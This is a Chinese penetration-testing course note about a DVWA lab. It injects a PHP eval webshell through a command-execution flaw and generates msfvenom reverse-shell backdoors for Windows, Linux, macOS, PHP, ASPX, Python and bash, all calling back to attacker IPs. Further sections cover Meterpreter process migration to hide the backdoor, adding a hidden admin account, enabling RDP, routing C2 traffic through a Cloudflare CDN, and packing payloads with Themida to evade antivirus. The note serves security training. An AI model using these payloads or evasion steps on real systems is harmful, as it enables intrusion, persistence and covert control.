---
typora-root-url: D:\icq\MD\images\命令执行上线msf后门
---

## 一、搭建靶场，通过命令执行漏洞完成msfvenom后门上线和 web_delivery上线。

命令执行利用msfvenom后门上线，一般是先通过命令执行上传webshell，再通过webshell上传msfvenom生成的后门上线

靶机DVWA（内网虚拟机）：192.168.10.52

攻击机（云服务器）：124.222.14.190

1. 命令执行写入webshell

   ```cmd
   127.0.0.1 & echo ^<?php eval($_POST[aaa]);?^> > shell.php
   ```

   ![image-20220705202029707](/D:/icq/MD/images/命令执行上线msf后门/image-20220705202029707.png)

   

2. 验证shell

   

   ![image-20220705202401198](/D:/icq/MD/images/命令执行上线msf后门/image-20220705202401198.png)

   

3. msfvenom生成后门文件

   ```shell
   msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=124.222.14.190 lport=14444 -f exe -o back1.exe
   ```

   ![image-20220705203143971](/D:/icq/MD/images/命令执行上线msf后门/image-20220705203143971.png)

   

4. 后门文件加壳后上传到靶机

   

   ![image-20220705203506564](/D:/icq/MD/images/命令执行上线msf后门/image-20220705203506564.png)

   

   ![image-20220705204306733](/D:/icq/MD/images/命令执行上线msf后门/image-20220705204306733.png)

   

5. 攻击机开启监听，靶机执行后门文件

   

   ![image-20220705204445791](/D:/icq/MD/images/命令执行上线msf后门/image-20220705204445791.png)

   

   ![image-20220705204807702](/D:/icq/MD/images/命令执行上线msf后门/image-20220705204807702.png)

   

6. 攻击机监听到靶机上线

   

   ![image-20220705204720871](/D:/icq/MD/images/命令执行上线msf后门/image-20220705204720871.png)

   

7. 进程迁移，隐藏后门进程

   

   后门进程pid1844，phpstudy进程pid4748

   

   ![image-20220705205112649](/D:/icq/MD/images/命令执行上线msf后门/image-20220705205112649.png)

   

   ![image-20220705205646544](/D:/icq/MD/images/命令执行上线msf后门/image-20220705205646544.png)

   

   将进程迁移到4748

   

   ![image-20220705205835049](/D:/icq/MD/images/命令执行上线msf后门/image-20220705205835049.png)

   

   

命令执行利用web_delivery后门上线

1. 使用web_delivery模块

   

   ![image-20220705210507637](/D:/icq/MD/images/命令执行上线msf后门/image-20220705210507637.png)

   

2. 配置参数如下

   

   ![image-20220705225151326](/D:/icq/MD/images/命令执行上线msf后门/image-20220705225151326.png)

   

3. 运行模块获取指令

   

   ![image-20220705225232337](/D:/icq/MD/images/命令执行上线msf后门/image-20220705225232337.png)

   

4. 靶机漏洞环境命令执行

   

   ![image-20220705225356189](/D:/icq/MD/images/命令执行上线msf后门/image-20220705225356189.png)

   

   

5. 执行后攻击机便可以收到监听

   

   ![image-20220705225452081](/D:/icq/MD/images/命令执行上线msf后门/image-20220705225452081.png)



## 二、完成当日课程笔记，掌握msf使用流程

**msfvenom**

msfvenom生成后门：

```shell
msfvenom -p [payload] [payload的设置] -f [保存的文件类型] -o [想输出的文件名]
```

相关参数：

- p：--payload，指定特定的 Payload，如果被设置为 - ，那么从标准输入流中读取。几乎支持全平台。

- l：--list，列出所有可用的项目，其中值可以被设置为 payloads, encoders, nops, all

- n：--nopsled，指定 nop 在 payload 中的数量

- f：--format，指定 Payload 的输出格式（--list formats：列出所有可用的输出格式）

- e：--encoder，指定使用的encoder

- a：--arch，指定目标系统架构

- -platform：指定目标系统平台

- s：--space，设置未经编码的 Payload 的最大长度（--encoder-space：编码后的 Payload 的最大长度）

- b：--bad-chars，设置需要在 Payload 中避免出现的字符，例如：’\0f’、’\x00’等

- i：--iterations，设置 Payload 的编码次数

- -smallest：尽可能生成最短的 Payload

- o：--out，保存 Payload 到文件

- c：--add-code，指定一个附加的win32 shellcode文件

- x：--template，指定一个特定的可执行文件作为模板

- k：--keep，保护模板程序的功能，注入的payload作为一个新的进程运行。

- msfvenom --list formats，列出所有支持的格式

- msfvenom --list payloads，列出所有支持的payload

- msfvenom --list encoders，列出所有支持的encoder



msfvenom 生成操作系统后门：

- Windows

```shell
msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.1.136 lport=12345 -f exe -o 123.exe
```

- linux

```shell
#64位架构
msfvenom -p linux/x64/meterpreter/reverse_tcp lhost=192.168.1.136 lport=12345 -f elf -o 123.elf

#32位架构
msfvenom -p linux/x86/meterpreter/reverse_tcp lhost=192.168.1.136 lport=12345 -f elf -o 123.elf
```

- mac

```shell
msfvenom -p osx/x64/meterpreter/reverse_tcp lhost=192.168.1.136 lport=12345 -f macho -o 123.macho
```



msfvenom 生成 web 后门：

- php

```shell
msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.1.136 lport=12345 -f raw -o 123.php
```

- aspx 

```shell
msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.1.136 lport=12345 -f aspx -o 123.aspx
```



msfvenom生成脚本后门

- python

```shell
msfvenom -p python/meterpreter/reverse_tcp lhost=192.168.1.136 lport=12345 -f raw
```

- bash

```shell
msfvenom -p cmd/uninx/reverse_bash lhost=192.168.1.136 lport=12345 -f raw
```



命令执行漏洞完成msfvenom后门上线

一 、渗透测试msfvenom生成的后门一般方法：

1. 攻击web站点，上传webshell
2. 通过webshell再次上传msfvenom后门
3. 攻击机开启handler监听，靶机运行msfvenom后门，上线 （linux操作系统 elf记得改权限）



二、msf web_delivery 上线meterpreter

1. 配置exploit/multi/script/web_delivery参数
2. 执行生成的命令执行payload，后门上线



web_delivery 和 msfvenom 的区别

- web_delivery不会有文件落地（不会上传木马到目标服务器的磁盘中，直接把脚本加载进内存中执行，绕过杀毒软件的可能性更大）

- msfvenom会上传后门病毒到目标磁盘中





**msf payload**

- payload 解释

windows/x64/meterpreter/reverse_tcp

操作系统/架构/想干什么/想用什么方法去干 



- payload的分类

- - stageless（不分段的） 
  - staged（分段的）

- 分段的：

  windows/x64/meterpreter/reverse_tcp  staged payload（小马&一句话木马）

  - 特点：小，只保留后门木马的连接。使用时，staged 后门只负责与攻击机建立连接，攻击机再把后门相应的功能传输进靶机的内存中执行

  - 优点：便于修改，和绕过杀毒软件查杀

  - 缺点：如果网络状态不好，容易掉线

- 不分段的：

  windows/x64/meterpreter_reverse_tcp  stageless payload （大马）

  - 特点：大，是完整的木马，不需要再和攻击机进行传输后门

  - 优点：不需要复杂的传输过程，适用于网络环境不好的情况

  - 缺点：很容易被杀毒软件查杀，且不易做免杀

   

- 协议分类

  - windows/x64/meterpreter/reverse_tcp

  - windows/x64/meterpreter/reverse_http

  - windows/x64/meterpreter/reverse_https

  

- 正向和反弹

  反弹：

  1. windows/x64/meterpreter/reverse_tcp

  2. 攻击机开启监听

     handler -p xxx -H 攻击机的IP -P 想开的监听端口号

  3. 靶机运行后门上线

  正向：

  1. windows/x64/meterpreter/bind_tcp

  2. 靶机运行后门开启监听

  3. 攻击机连接靶机

     handler -p xxx -H 靶机的IP  -P 靶机已经开启的端口



msfconsole常用命令

- show exploits – 查看所有可用的渗透攻击程序代码 

- show auxiliary – 查看所有可用的辅助攻击工具 

- [show]options/advanced – 查看该模块可用选项 

- show payloads – 查看该模块适用的所有载荷代码 

- show targets – 查看该模块适用的攻击目标类型 

- search – 根据关键字搜索某模块 

- info – 显示某模块的详细信息 

- use – 使用某渗透攻击模块 

- back – 回退 

- set/unset – 设置/禁用模块中的某个参数 

- setg/unsetg – 设置/禁用适用于所有模块的全局参数 

- save – 将当前设置值保存下来，以便下次启动MSF终端时仍可使用

- advanced - 查看首选项

- sessions - 查看会话列表

- jobs - 查看任务列表





**meterpreter**

在meterpreter中执行的命令，默认都是在靶机，如果想执行攻击机上的命令，要在命令前加上l 代表 local 如。 lls lpwd 

- 命令行 shell

windows 打开cmd shell后会出现乱码 ，可以使用  chcp 65001 更改编码为utf-8 

linux 打开 bash shell时不会有命令提示符，如果需要可以使用 python -c "import pty;pty.spawn('/bin/bash');"  [ 前提是目标机器上要有python]

- 文件读写

读取文件  cat 

上传文件 upload [想上传的文件路径] [ 想上传到靶机的哪个地方] upload ./uEcESfQA.jpeg C:\\windows\\temp\\

下载文件 download       download id_rsa /tmp/

- IO操作

屏幕截图  screenshot 

屏幕监控  screenshare  ( 一般情况下 网络环境不好会很卡)

摄像头监控   webcam_list  /  webcam_snap  / webcam_stream

- 远程登录

添加后门用户

shell >  net user zhangsan 123456 /add

shell > net localgroup administrators zhangsan /add

meterpreter > run getgui -e  开启RDP服务

- 进程迁移

migrate [pid] 	将进程迁移到正常的进程中 （要注意权限，只能向同等权限，或低权限进程迁移）



**流量隐藏**

- cdn 

1. 用一个域名  通过 cloudflare cdn 解析到 攻击机 ip 
2. 制作后门 

```shell
msfvenom -p windows/x64/meterpreter/reverse_http lhost=fiqpgfap9ehbgahg49v124asf.fwsdwafawf324g.ml lport=2095 -f exe -o hahaha.exe
```

```txt
Cloudflare支持的HTTP端口是：


80,8080,8880,2052,2082,2086,2095


Cloudflare支持的HTTPs端口是：


443,2053,2083,2087,2096,8443
```

1. 攻击机开启监听

```shell
handler -p windows/x64/meterpreter/reverse_http -H fiqpgfap9ehbgahg49v124asf.fwsdwafawf324g.ml -P 2095
```

2. 靶机运行后门 ，上线meterpreter



**加壳免杀**

- themida， 能过火绒，腾讯管家等 ， 360 和 win defender 过不了









​	
